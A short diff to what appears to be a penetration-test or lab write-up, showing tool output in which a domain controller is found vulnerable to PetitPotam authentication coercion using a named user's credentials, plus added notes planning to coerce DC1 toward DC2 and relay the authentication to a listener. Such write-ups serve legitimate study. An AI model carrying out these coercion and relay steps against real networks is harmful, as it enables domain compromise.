@@ -705,6 +705,9 @@ SMB         10.1.139.227    445    DC1              [+] dismay.hsm\mike.silver:P
 COERCE_PLUS 10.1.139.227    445    DC1              VULNERABLE, PetitPotam
 COERCE_PLUS 10.1.139.227    445    DC1              Exploit Success, efsrpc\EfsRpcAddUsersToFile
 ```
+Ill use `mike.silver` credentials on dc1 since this is what i want to coerce to dc2
+
+Ill also specify my listener to relay the auth
 
 
 
